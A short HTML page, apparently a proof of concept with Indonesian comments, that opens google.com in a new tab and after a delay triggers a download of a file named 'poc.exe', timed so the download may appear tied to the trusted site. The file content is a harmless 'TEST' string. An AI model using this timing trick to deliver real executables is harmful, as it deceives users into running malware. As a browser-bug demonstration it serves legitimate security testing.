<!doctype html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Delayed Download After Tab Load (Best-effort)</title>
<style>
  body { font-family: Arial, sans-serif; padding: 40px; }
  button { padding: 14px 22px; font-size: 16px; }
  #log { margin-top: 16px; font-size: 14px; color: #555; }
</style>
</head>
<body>

<h2>Delayed Download After New Tab Load</h2>
<p>
Klik tombol. Tab baru akan dibuka ke google.com.
Setelah delay, download akan dipicu.
</p>

<button id="run">Open Google → Delayed Download</button>
<div id="log"></div>

<script>
const log = (s) => document.getElementById('log').textContent += s + "\n";

document.getElementById("run").onclick = () => {
  log("User clicked");

  // 1) Buka tab baru (user gesture)
  window.open("https://www.google.com", "_blank");
  log("Opened new tab to google.com");

  // 2) Delay cukup lama agar google.com kemungkinan sudah load penuh
  //    (Android Chrome: 1500–3000ms biasanya cukup)
  setTimeout(() => {
    log("Triggering download now");

    // 3) Trigger download (masih dalam gesture chain di beberapa Chrome)
    const a = document.createElement("a");
    a.href = "data:application/octet-stream,TEST";
    a.download = "poc.exe";
    document.body.appendChild(a);
    a.click();
    a.remove();

  }, 2500); // Coba 1500–3000ms
};
</script>

</body>
</html>